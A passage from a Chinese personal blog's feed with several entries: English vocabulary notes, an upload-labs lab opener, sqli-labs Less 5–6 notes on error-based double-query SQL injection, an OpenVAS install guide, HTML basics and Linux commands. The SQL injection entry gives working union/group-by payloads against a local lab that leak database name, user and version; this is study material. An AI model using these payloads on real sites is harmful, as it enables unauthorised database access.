health problem, “ the authors said in a statement.</p><ul><li>threshold 门界，门槛，界限<blockquote><p>on the threshold of sth<br>they are on the threshold of adulthood</p></blockquote></li></ul><p>“Despite the enormity of the problem, our findings suggest that global elimination is within reach, “ said lead author Karen Canfell, a professor at the Cancer Council New South Wales, in Sydney.</p><ul><li>enormity 严重性 巨大的<blockquote><p>enormous 巨大的 庞大的</p></blockquote></li><li>within reach 近在咫尺<blockquote><p>near by</p></blockquote></li></ul><p>Achieving that goal, however, depends on “both high coverage of HPV vaccination and cervical screening, “ she added.</p><ul><li>coverage :范围 规模</li></ul><p>Clinical trials have shown that HPV vaccines are safe and effective against the two HPV strains—types 16 and 18—responsible for 70 percent of cervical cancer cases.</p><ul><li>Clinical adj .临床的<blockquote><p>clininc 诊所</p></blockquote></li><li>trials n.试验 审判（trial）</li><li>strains 变种 变体</li></ul><p>The study’s projections presume the vaccination of 80 percent of girls 12 to 15 years old starting in 2020, and that at least 70 percent of women undergo screening twice in their lifetime.</p><ul><li>projections  预测 </li><li>presume 假设</li></ul><p>This would push the prevalence of the disease below the bar of 4/100, 000 women in countries such as the United States, Canada, Britain and France by 2059, and in mid-income countries such as Brazil and China by 2069, the authors calculate.</p><ul><li>prevalence ：流行 普及</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;Vaccine could virtually eliminate cervical cancer：study&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="English Reading Comprehension" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/English-Reading-Comprehension/"/>
    
    
      <category term="English" scheme="blog.manhao6.cn/tags/English/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs通关挑战</title>
    <link href="blog.manhao6.cn/2018/08/13/upload-labs%E9%80%9A%E5%85%B3%E6%8C%91%E6%88%98/"/>
    <id>blog.manhao6.cn/2018/08/13/upload-labs通关挑战/</id>
    <published>2018-08-13T15:25:31.000Z</published>
    <updated>2019-08-15T23:37:16.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>文件上传通关挑战</p><h1 id="0x02-start"><a href="#0x02-start" class="headerlink" title="0x02 start"></a>0x02 start</h1><h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass 01"></a>pass 01</h2><p>查看网页源代码发现只允许上传jpg|.png|.gif文件（前端禁用）<br><img src="/upload-labs通关挑战/20190813113241666.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h1&gt;&lt;p&gt;文件上传通关挑战&lt;/p&gt;
&lt;h1 id=&quot;0x02-start&quot;&gt;&lt;a href=&quot;#0x02-start&quot; class=&quot;
      
    
    </summary>
    
      <category term="0x01 web安全" scheme="blog.manhao6.cn/categories/0x01-web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件上传" scheme="blog.manhao6.cn/categories/0x01-web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="文件上传" scheme="blog.manhao6.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="upload" scheme="blog.manhao6.cn/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab学习笔记less6-7（双重查询）</title>
    <link href="blog.manhao6.cn/2018/05/07/%E5%8F%8C%E9%87%8D%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2/"/>
    <id>blog.manhao6.cn/2018/05/07/双重注入查询/</id>
    <published>2018-05-07T15:02:45.000Z</published>
    <updated>2019-04-15T09:09:31.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="双重注入查询"><a href="#双重注入查询" class="headerlink" title="双重注入查询:"></a>双重注入查询:</h2><p>相关函数介绍：<br>对于双重查询，需要先了解count，rand（），floor函数功能以及group by语法用法<br>1.concat函数用法<br>concat（string1，string2，string3）将string1，string2，string3字符串连接起来输出（orcle只允许2个字符串）<br><img src="https://upload-images.jianshu.io/upload_images/8707100-e05dc36c5ad3fe4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/8707100-39eac8763592b90e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="concat函数用法"><br><a id="more"></a><br>2.count函数<br>我们可以用 select <em> from information_schema.schemata ,来查询当前数据库信息<br><img src="https://upload-images.jianshu.io/upload_images/8707100-58f7b2b76411efc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>再根据count函数，我们可以得知当前数据库总数，count函数就是列出当前指定值的数目，count（</em>） freom information_schema.schamata中列出数据库的记录数<br><img src="https://upload-images.jianshu.io/upload_images/8707100-795ce558337b2afc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>3.rand（）函数<br>由下图可以看到，selecr rand（）返回的结果是小于1的随机小数.<br><img src="https://upload-images.jianshu.io/upload_images/8707100-a49c37770c0e76e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>4.floor（）函数用法<br>floor向下取整<br><img src="https://upload-images.jianshu.io/upload_images/8707100-0ef7bb32013c744a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>5.group by 用法</p><p>GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组</p><h2 id="双重查询原理"><a href="#双重查询原理" class="headerlink" title="双重查询原理"></a>双重查询原理</h2><p>研究人员发现，使用group by结合rand（）以及count（*）这样聚集函数，在sql查询时会出现错误，这种错误随机产生，这样就产生的双重查询注入，使用floor函数只是为了将查询结果分类。<br>下面我们来结果几个函数用法,看几个简单的组合<br><img src="https://upload-images.jianshu.io/upload_images/8707100-3a81075f19261032.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>SELECT floor(rand()<em>2);我们从里向外看。rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0<br>采用如果 SELECT CONCAT((SELECT database()), FLOOR(RAND()</em>2));<br><img src="https://upload-images.jianshu.io/upload_images/8707100-9e4845de2e7c7fac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>select database()返回用户名，再与floor取整函数取得数字相连，floor（rand（））不是0就是1，所以结果又随机两种，<br>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))a from user;<br><img src="https://upload-images.jianshu.io/upload_images/8707100-ea94accd841c40a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>如果后面跟一个表名，那么就会返回一个集合，集合大小由表本生条数决定。我的数据库有3个管理员，所以就会返回3条记录。<br>我们选择information_schema.tables表来查询，因为表数据多，产生较多的随机数,然后group by 分组显示出来<br>select concat ((select database())), floor(rand()*2))as a from information_schema.tables group by a;<br>其中concat（）as a 是将查询到的结果取一个别名，然后根据别名分组。<br><img src="https://upload-images.jianshu.io/upload_images/8707100-93460dab54dcc99d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><blockquote><p>这样mysql0分到一组，mysql1分到一组。就只有两种结果了<br>最后再结合count（*），聚集函数，则会有可能报错，但是注意到报错信息所附带我们需要的信息，而不是正常的报错信息。所以就产生了双重查询<br><img src="https://upload-images.jianshu.io/upload_images/8707100-62dc08ed95dfadc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/8707100-ec06d06f33a35806.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*),CONCAT((SELECT user()), FLOOR(RAND()<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a;(查询当前用户)</span><br><span class="line">SELECT count(*),CONCAT((SELECT version()), FLOOR(RAND()<span class="number">*2</span>))as a <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by a;（查询数据库版本</span><br></pre></td></tr></table></figure></p></blockquote><p>深层原理：<a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-14312.html</a> 大神分享的<br>对于less-6 payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli/Less-6/?id=1" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/8707100-0f1f7461702b4c75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="less-6"></p><p>less-5 payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli/Less-5/?id=1' and 1=( <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/8707100-6160853ed4e932af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="less-5"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;双重注入查询&quot;&gt;&lt;a href=&quot;#双重注入查询&quot; class=&quot;headerlink&quot; title=&quot;双重注入查询:&quot;&gt;&lt;/a&gt;双重注入查询:&lt;/h2&gt;&lt;p&gt;相关函数介绍：&lt;br&gt;对于双重查询，需要先了解count，rand（），floor函数功能以及group by语法用法&lt;br&gt;1.concat函数用法&lt;br&gt;concat（string1，string2，string3）将string1，string2，string3字符串连接起来输出（orcle只允许2个字符串）&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/8707100-e05dc36c5ad3fe4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt&gt;&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/8707100-39eac8763592b90e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;concat函数用法&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="0x01 技术原理" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
    
      <category term="sql" scheme="blog.manhao6.cn/categories/0x01-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/sql/"/>
    
    
      <category term="sqli-lab" scheme="blog.manhao6.cn/tags/sqli-lab/"/>
    
      <category term="双重查询" scheme="blog.manhao6.cn/tags/%E5%8F%8C%E9%87%8D%E6%9F%A5%E8%AF%A2/"/>
    
  </entry>
  
  <entry>
    <title>openvas安装</title>
    <link href="blog.manhao6.cn/2018/02/07/openvas/"/>
    <id>blog.manhao6.cn/2018/02/07/openvas/</id>
    <published>2018-02-07T15:02:45.000Z</published>
    <updated>2019-04-15T09:07:14.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="openvas软件介绍"><a href="#openvas软件介绍" class="headerlink" title="openvas软件介绍"></a>openvas软件介绍</h2><p>OpenVAS是一款开放式的漏洞评估工具，主要用来检测目标网络或主机的安全性，OpenVAS能够基于C/S(客户端/服务器),B/S(浏览器/服务器)架构进行工作，管理员通过浏览器或者专用客户端程序来下达扫描任务，服务器端负载授权，执行扫描操作并提供扫描结果。<br><img src="http://upload-images.jianshu.io/upload_images/8707100-02bb9185170ba544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="QQ20180207-231050.png"><br><a id="more"></a></p><ul><li>服务器层组件<br>openvas-scanner(扫描器):负责调用各种漏洞检测插件，完成实际的扫描操作。<br>openvas-manager(管理器):负责分配扫描任务，并根据扫描结果生产评估报告。</li><li>客户层组件<br>openvas-cli(命令行接口):负责提供从命令行访问OpenVAS服务层程序。<br>greenbone-security-assistant(安装助手):负责提供访问OpenVAS服务层的web接口，便于通过浏览器来执行扫描任务，是使用最简便的客户层组件。<h2 id="openvas安装"><a href="#openvas安装" class="headerlink" title="openvas安装"></a>openvas安装</h2>  实验环境：fedora 27 in virtual box（关闭selinux）</li></ul><ul><li>1 更新系统软件<blockquote><p>sudo yum update -y</p></blockquote></li><li>2 安装openvas<blockquote><p>sudo yum intsall openvas*</p></blockquote></li><li>3 安装redis数据库<blockquote><p>sudo yum install redis*</p></blockquote></li><li>4 安装sqlite3<blockquote><p>sudo yum install sqlite3</p></blockquote></li><li>5 安装证书生成工具<blockquote><p>sudo yum install gnutls-utils</p></blockquote></li><li><p>6 编译redis 配置文件</p><blockquote><p>sudo vi /etc/redis.conf<br>取消以下两行注释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> unixsocket /tmp/redis.sock</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> unixsocketperm 700</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>7 运行redis服务</p><blockquote><p>sudo redis-server /etc/redis.conf &amp;(&amp;守护程序，后台运行)</p></blockquote></li><li><p>8 解决安装问题<br>检查是否安装成功（openvas-check-setup命令指导安装openvas安装问题）</p><p>根据提示进一步操作</p><blockquote><p>sudo openvas-check-setup –v9 </p></blockquote><ul><li>按照fix提示，可需要如下命令<blockquote><p>下载nvt库<br>sudo greenbone-nvt-sync<br>建立本地scapdata数据库<br>sudo greenbone-scapdata-sync<br>获取证书文件<br>sudo grennbone-certdata-sync<br>创建所需要的目录<br>sudo mkdir -p /var/lib/openvas/openvasmd/gnupg/ (-p表示递归创建目录)</p></blockquote></li></ul></li><li><p>9启动scanner</p><blockquote><p>sudo openvassd</p></blockquote></li><li><p>10 重建数据库</p><blockquote><p>sudo openvasmd –rebuild</p></blockquote></li><li><p>11创建用户admin</p><blockquote><p>sudo openvasmd –user=admin –new-password=password(password为自己所设密码)</p></blockquote></li><li>12 生成证书<blockquote><p>sudo openvas-manage-certs -a</p></blockquote></li><li><p>13 启动greenbone security assistant</p><blockquote><p>sudo gsad –listen=127.0.0.1 –port=9392</p></blockquote></li><li><p>14 启动openvas管理器</p><blockquote><p>sudo openvassmd</p></blockquote></li></ul><p>使用openvas-check-setup -v9 出现it seem like your openvas-9 installation is ok 表示安装成功</p><h2 id="登录openvas浏览器"><a href="#登录openvas浏览器" class="headerlink" title="登录openvas浏览器"></a>登录openvas浏览器</h2><p>在浏览器输入<a href="https://127.0.0.1:9392(https不可省略)" target="_blank" rel="noopener">https://127.0.0.1:9392(https不可省略)</a><br>添加信任 advaced-&gt;add exception-&gt;confirm security exception<br><img src="https://upload-images.jianshu.io/upload_images/8707100-9457f781b145c9f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>登录admin 和所设密码进入openvas</p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>需要对扫描配置做一些更改，为之后端口扫描准备</p><blockquote><p>/var/lib/openvas/plugins/nmap.nasl 对nmap.nasl修改<br>407:if(ver)改成if（svc）,411:log_message最后ver前面添加svc<br>388:后面添加花括号，并且在418对花括号闭合<br>413：svc改为string </p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8707100-2b8fafce128d070a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>最后重启openvass</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;openvas软件介绍&quot;&gt;&lt;a href=&quot;#openvas软件介绍&quot; class=&quot;headerlink&quot; title=&quot;openvas软件介绍&quot;&gt;&lt;/a&gt;openvas软件介绍&lt;/h2&gt;&lt;p&gt;OpenVAS是一款开放式的漏洞评估工具，主要用来检测目标网络或主机的安全性，OpenVAS能够基于C/S(客户端/服务器),B/S(浏览器/服务器)架构进行工作，管理员通过浏览器或者专用客户端程序来下达扫描任务，服务器端负载授权，执行扫描操作并提供扫描结果。&lt;br&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/8707100-02bb9185170ba544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;QQ20180207-231050.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="0x02 应用实践" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    
      <category term="软件安装" scheme="blog.manhao6.cn/categories/0x02-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"/>
    
    
      <category term="openvass" scheme="blog.manhao6.cn/tags/openvass/"/>
    
      <category term="漏洞扫描" scheme="blog.manhao6.cn/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>html学习笔记（一）</title>
    <link href="blog.manhao6.cn/2018/02/07/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>blog.manhao6.cn/2018/02/07/html学习笔记（一）/</id>
    <published>2018-02-07T13:02:45.000Z</published>
    <updated>2019-04-15T09:01:40.087Z</updated>
    
    <content type="html"><![CDATA[<p>什么是html：<br>html是一种网页描述语言，html使用标记标签来描述网页，web浏览器作用是读取html文档，并且以网页的形式显示它们，浏览器不会显示html标签，而是使用标签来解释页面的内容<br>html基础知识<br>—-html标题<br>HTML 标题（Heading）是通过&lt; h1&gt; - &lt; h6&gt; 等标签进行定义的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;This is a heading&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;This is a heading&lt;/h2&gt;</span><br><span class="line">&lt;h3&gt;This is a heading&lt;/h3&gt;</span><br></pre></td></tr></table></figure></p><a id="more"></a><h3 id="html段落"><a href="#html段落" class="headerlink" title="html段落"></a>html段落</h3><p>HTML 段落是通过 &lt; p&gt; 标签进行定义的。<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;This <span class="keyword">is</span> a <span class="built_in">paragraph</span>.&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><h3 id="html链接"><a href="#html链接" class="headerlink" title="html链接"></a>html链接</h3><p>HTML 链接是通过 &lt; a&gt; 标签进行定义的。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=<span class="string">"http://www.baidu.com"</span>&gt;This is <span class="selector-tag">a</span> link&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><ul><li>注释：在 href 属性中指定链接的地址。</li></ul><h3 id="html图像"><a href="#html图像" class="headerlink" title="html图像"></a>html图像</h3><p>HTML 图像是通过 &lt; img&gt; 标签进行定义的。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"w3school.jpg"</span> <span class="attribute">width</span>=<span class="string">"104"</span> <span class="attribute">height</span>=<span class="string">"142"</span> /&gt;</span><br></pre></td></tr></table></figure></p><p>HTML 标签对大小写不敏感：&lt; P&gt; 等同于 &lt; p&gt;许多网站都使用大写的 HTML 标签。</p><h3 id="html水平线"><a href="#html水平线" class="headerlink" title="html水平线"></a>html水平线</h3><p>&lt; hr&gt; 标签在 HTML 页面中创建水平线。<br>hr 元素可用于分隔内容。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="html注释"><a href="#html注释" class="headerlink" title="html注释"></a>html注释</h3><p>可以将注释插入HTML代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一个注释 --&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以将注释插入HTML代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是html：&lt;br&gt;html是一种网页描述语言，html使用标记标签来描述网页，web浏览器作用是读取html文档，并且以网页的形式显示它们，浏览器不会显示html标签，而是使用标签来解释页面的内容&lt;br&gt;html基础知识&lt;br&gt;—-html标题&lt;br&gt;HTML 标题（Heading）是通过&amp;lt; h1&amp;gt; - &amp;lt; h6&amp;gt; 等标签进行定义的&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;h1&amp;gt;This is a heading&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;h2&amp;gt;This is a heading&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;h3&amp;gt;This is a heading&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="0x05 生活杂项" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/"/>
    
      <category term="html" scheme="blog.manhao6.cn/categories/0x05-%E7%94%9F%E6%B4%BB%E6%9D%82%E9%A1%B9/html/"/>
    
    
      <category term="html" scheme="blog.manhao6.cn/tags/html/"/>
    
      <category term="网页" scheme="blog.manhao6.cn/tags/%E7%BD%91%E9%A1%B5/"/>
    
  </entry>
  
  <entry>
    <title>linux 命令</title>
    <link href="blog.manhao6.cn/2018/02/05/linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <id>blog.manhao6.cn/2018/02/05/linux基本命令/</id>
    <published>2018-02-05T15:02:45.000Z</published>
    <updated>2019-04-15T09:05:33.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux基本命令"><a href="#linux基本命令" class="headerlink" title="linux基本命令"></a>linux基本命令</h2><p>Linux系统下基本命令（要区分大小写 ）<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br><a id="more"></a><br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）</p><h2 id="bash-history-显示系统命令时间"><a href="#bash-history-显示系统命令时间" class="headerlink" title="bash_history 显示系统命令时间"></a>bash_history 显示系统命令时间</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'HISTTIMEFORMAT="%F %T "'</span> &gt;&gt; ~/.bashrc</span></span><br><span class="line">或</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'HISTTIMEFORMAT="%F %T "'</span> &gt;&gt; ~/.bash_profile</span></span><br></pre></td></tr></table></figure><p>在bashrc添加如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">readonly</span> HISTFILE // 更改历史文件名称:HISTFILE=/var/<span class="built_in">history</span>/<span class="variable">$USER</span>-<span class="variable">$UID</span>.<span class="built_in">log</span></span><br><span class="line"><span class="built_in">readonly</span> HISTFILESIZE  // 定义了在 .bash_history 中保存命令的记录总数.</span><br><span class="line"><span class="built_in">readonly</span> HISTSIZE //控制历史命令的总数</span><br><span class="line"><span class="built_in">readonly</span> HISTCMD</span><br><span class="line"><span class="built_in">readonly</span> HISTCONTROL //剔除连续的重复条目</span><br><span class="line">HISTCONTROL=ignoredups <span class="comment"># 使用HISTCONTROL来消除命令历史中的连续重复条目 </span></span><br><span class="line">HISTCONTROL=erasedups <span class="comment"># 使用HISTCONTROL在整个历史中去除重复命令 </span></span><br><span class="line">HISTCONTROL=ignorespace <span class="comment"># 使用HISTCONTROL强制history忽略某条特定命令(这里是空格)</span></span><br><span class="line"><span class="built_in">readonly</span> HISTIGNORE <span class="comment">#存储历史命令时忽略特殊命令</span></span><br><span class="line"><span class="comment"># readonly linux只读命令</span></span><br><span class="line"><span class="comment">#为history添加时间戳</span></span><br><span class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">'%F %T '</span></span><br></pre></td></tr></table></figure></p><p>source ~/.bashrc或source ~/.bash_profile</p><h2 id="chattr-命令"><a href="#chattr-命令" class="headerlink" title="chattr 命令"></a>chattr 命令</h2><p>chattr +i test.txt  设置只可读 +i -i 去除可读限制<br><img src="http://picture.manhao6.cn/linux基本命令/20190309100459508.png" alt><br>chattr +a test.txt  设置只能追加？（append-only） -a取消<br><img src="http://picture.manhao6.cn/linux基本命令/20190309100753833.png" alt><br>chattr -R +i ./test-dir/ 对目录所有文件添加限制<br>相关命令如下：</p><blockquote><p>a：让文件或目录仅供附加用途。<br>b：不更新文件或目录的最后存取时间。<br>c：将文件或目录压缩后存放。<br>d：将文件或目录排除在倾倒操作之外。<br>i：不得任意更动文件或目录。<br>s：保密性删除文件或目录。<br>S：即时更新文件或目录。<br>u：预防意外删除。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;linux基本命令&quot;&gt;&lt;a href=&quot;#linux基本命令&quot; class=&quot;headerlink&quot; title=&quot;linux基本命令&quot;&gt;&lt;/a&gt;linux基本命令&lt;/h2&gt;&lt;p&gt;Linux系统下基本命令（要区分大小写 ）&lt;br&gt;uname 显示版本信息（同win2K的 ver）&lt;br&gt;dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）&lt;br&gt;
    
    </summary>
    
      <category term="0x03 操作系统" scheme="blog.manhao6.cn/categories/0x03-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="linux" scheme="blog.manhao6.cn/categories/0x03-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/linux/"/>
    
    
      <category term="linux" scheme="blog.manhao6.cn/tags/linux/"/>
    
      <category term="命令" scheme="blog.manhao6.cn/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
</feed>
